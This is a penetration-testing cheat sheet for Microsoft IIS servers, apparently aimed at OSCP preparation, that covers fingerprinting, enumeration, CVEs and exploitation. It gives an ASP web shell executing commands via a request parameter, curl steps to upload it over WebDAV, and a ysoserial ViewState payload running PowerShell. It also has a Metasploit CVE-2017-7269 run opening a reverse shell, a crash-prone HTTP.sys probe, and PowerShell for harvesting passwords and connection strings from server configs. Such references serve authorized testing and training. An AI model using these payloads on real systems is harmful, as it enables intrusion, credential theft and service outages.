# Microsoft IIS

> Internet Information Services reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|x-powered-by|x-aspnet)'
```

Expected output:

```text
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
```

### Default error pages

IIS default 404 / 500 pages:

- `HTTP Error 404.0 - Not Found`
- `The resource you are looking for has been removed, had its name changed, or is temporarily unavailable.`
- Detailed errors (if `customErrors="Off"`): stack trace + physical path
- `Server Error in '/' Application.` (ASP.NET default)

### Default welcome page

```html
<title>IIS Windows Server</title>
<img src="iisstart.png" alt="IIS" />
```

### nmap / whatweb

```bash
nmap -sV -p 80,443,8080 --script http-headers,http-title,http-iis-webdav-vuln <TARGET>
whatweb -a 3 http://<TARGET>/
```

---

## 2. Enumeration

### Version fingerprinting

IIS version -> Windows version mapping:

| Server header | Likely OS |
|---------------|-----------|
| Microsoft-IIS/6.0 | Windows Server 2003 |
| Microsoft-IIS/7.0 | Windows Server 2008 |
| Microsoft-IIS/7.5 | Windows Server 2008 R2 |
| Microsoft-IIS/8.0 | Windows Server 2012 |
| Microsoft-IIS/8.5 | Windows Server 2012 R2 |
| Microsoft-IIS/10.0 | Windows Server 2016 / 2019 / 2022 |

### Common paths to test

```bash
for p in aspnet_client web.config iisstart.htm trace.axd elmah.axd \
         webdav _vti_bin _vti_inf.html msadc; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p")
  echo "$code  $p"
done
```

### Short name (8.3) enumeration

IIS leaks short names (DOS 8.3) in 404 responses on some configurations:

```bash
curl -s "http://<TARGET>/a%2a~1%2a%2e%2a" -i | head
```

Tools: `shortscan` (github.com/bitquark/shortscan).

```bash
shortscan http://<TARGET>/
```

### WebDAV

```bash
curl -s -X OPTIONS -i http://<TARGET>/ | grep -i allow
# Look for: PROPFIND, MKCOL, COPY, MOVE, PUT, DELETE
```

### Extension bruteforce

IIS-specific extensions:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -x asp,aspx,config,ashx,asmx
```

### Virtual directories / apps

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,401,403
```

---

## 3. Known CVEs

### CVE-2017-7269 - WebDAV buffer overflow (RCE)

Buffer overflow in `ScStoragePathFromUrl` (WebDAV). Pre-auth RCE on IIS 6.0.
Public exploit available (Metasploit, standalone).

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-7269
Affected: IIS 6.0 (Windows Server 2003).

Metasploit: `exploit/windows/iis/iis_webdav_scstoragepathfromurl`

### CVE-2015-1635 - HTTP.sys integer overflow (MS15-034)

Integer overflow in `HTTP.sys` -> DoS or RCE. Range header check:

NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-1635
Affected: IIS 7.5, 8.0, 8.5 (Windows 7/2008R2/2012/2012R2).

Detection:
```bash
curl -s -H "Range: bytes=0-18446744073709551615" http://<TARGET>/
# If 416 Requested Range Not Satisfiable -> vulnerable
# If 200/206 -> patched
```

### CVE-2022-21907 - HTTP.sys RCE

Wormable RCE in HTTP.sys. Triggered by crafted `Accept-Encoding` header.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-21907
Affected: Windows Server 2019 / 2022 (unpatched).

PoC detection (can crash unpatched, use with caution):
```bash
curl -s -H "Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" http://<TARGET>/
```

### CVE-2021-31166 - HTTP.sys RCE

Use-after-free in HTTP.sys. Wormable.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-31166
Affected: Windows 10 2004 / Server 2004 (unpatched).

### CVE-2010-2730 / MS10-065 - ASP.NET padding oracle

`ASP.NET` padding oracle via `.axd` handlers -> decrypt ViewState -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2010-2730
Affected: .NET < 4.0 with `machineKey` auto-generated and `enableViewStateMac` disabled.

Tool: `padbuster` / `ysoserial.net`.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| IIS 6.0 | WebDAV RCE | CVE-2017-7269 |
| IIS 7.5-8.5 | HTTP.sys | CVE-2015-1635 |
| Server 2019/2022 | HTTP.sys RCE | CVE-2022-21907 |
| Windows 10/Server 2004 | HTTP.sys RCE | CVE-2021-31166 |

---

## 4. Exploitation Patterns

### WebDAV PUT -> webshell (IIS 6.0)

```bash
# Enable WebDAV client
cadaver http://<TARGET>/
dav:/> put shell.asp
dav:/> ls
```

Or with curl:

```bash
curl -X PUT -T shell.asp http://<TARGET>/shell.asp
curl http://<TARGET>/shell.asp?cmd=whoami
```

Shell payload (`shell.asp`):

```asp
<%
Set o = CreateObject("WScript.Shell")
Set e = o.Exec("cmd /c " & Request("cmd"))
Response.Write e.StdOut.ReadAll
%>
```

### ASP.NET ViewState deserialization

If `machineKey` is exposed (web.config leak) or validation disabled:

```bash
# Generate payload with ysoserial.net
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e <base64>" --path="/default.aspx" --apppath="/" \
  --decryptionalg="AES" --decryptionkey="<key>" \
  --validationalg="SHA1" --validationkey="<key>"
```

Then POST `__VIEWSTATE=<payload>`.

### CVE-2017-7269 WebDAV RCE (Metasploit)

```text
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS <target>
set RPORT 80
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your ip>
run
```

### .NET machineKey leak

If `<machineKey>` is in `web.config` and `web.config` is readable:

```bash
curl -s http://<TARGET>/web.config
```

Then ViewState forgery / deserialization is possible.

### Trace.axd / elmah.axd

Diagnostic handlers leaking request details (cookies, headers, session):

```bash
curl -s http://<TARGET>/trace.axd
curl -s http://<TARGET>/elmah.axd
```

---

## 5. Misconfigurations

### Directory listing

```bash
curl -s http://<TARGET>/uploads/ | grep -i 'directory of'
```

### web.config readable

```bash
curl -s http://<TARGET>/web.config
```

### Detailed errors enabled

Trigger a 500 error, look for physical path in the response:

```bash
curl -s "http://<TARGET>/api/%00" -i | grep -iE 'physical path|line \d+'
```

### WebDAV enabled (IIS 6/7)

```bash
curl -X OPTIONS -i http://<TARGET>/ | grep -iE 'PROPFIND|PUT|MKCOL'
```

### Authentication endpoints

```bash
curl -s http://<TARGET>/ | grep -iE '401|www-authenticate'
# Look for: NTLM, Negotiate, Basic
```

### Short names

```bash
shortscan http://<TARGET>/
```

### .aspx.cs / .cs source exposure

```bash
curl -s http://<TARGET>/Default.aspx.cs
curl -s http://<TARGET>/Web.config.bak
```

---

## 6. Post-Exploitation

### Config file locations

| Scope | Path |
|-------|------|
| Global | `%SystemRoot%\System32\inetsrv\config\applicationHost.config` |
| Site | `<site root>\web.config` |
| App | `<app root>\web.config` |
| ASP.NET machine keys | `%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config` |

### What to look for

```powershell
Get-Content C:\Windows\System32\inetsrv\config\applicationHost.config | Select-String -Pattern 'physicalPath|userName|password|connectionString'
Get-ChildItem -Recurse -Filter web.config C:\inetpub\ | ForEach-Object { Get-Content $_.FullName | Select-String -Pattern 'password|machineKey|connectionString' }
```

### IIS logs

```powershell
Get-ChildItem C:\inetpub\logs\LogFiles\ -Recurse
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log -Tail 200
```

Logs may contain: credentials in URLs, session cookies, uploaded paths, failed auth attempts.

### Connection strings

Look for SQL Server credentials in `web.config`:

```xml
<connectionStrings>
  <add name="Default" connectionString="Data Source=.;Initial Catalog=App;User ID=sa;Password=...;" />
</connectionStrings>
```

### Application pool identities

```powershell
Get-ChildItem IIS:\AppPools | Select-Object Name, processModel
Get-Process -IncludeUserName | Where-Object { $_.ProcessName -match 'w3wp' }
```

If an app pool runs as a domain user, escalate to domain compromise.

### Web shell locations

```powershell
Get-ChildItem -Recurse -Include *.asp,*.aspx,*.ashx,*.asmx,*.config C:\inetpub\wwwroot\ -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5000 }
```

Look for freshly-created files (attacker persistence) - timestamps near compromise time.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `Server: Microsoft-IIS/x.x` header AND the `X-AspNet-Version` header if visible - they prove the exact version.

> [!IMPORTANT]
> OSCP report: for WebDAV exploitation, screenshot the OPTIONS response (showing PUT/PROPFIND allowed) AND the uploaded file content.

> [!IMPORTANT]
> OSCP report: for ViewState deserialization, screenshot the web.config snippet with machineKey AND the resulting shell output.

---

## 8. References

- IIS official docs: https://learn.microsoft.com/en-us/iis/
- NVD search: https://nvd.nist.gov/vuln/search/results?query=iis
- CVE-2017-7269 writeup: https://blog.0patch.com/2017/03/0day-for-iis-was-not-in-windows-server.html
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- shortscan: https://github.com/bitquark/shortscan
- HackTricks - IIS: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
- PayloadsAllTheThings - IIS: https://github.com/swisskyrepo/PayloadsAllTheThings

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*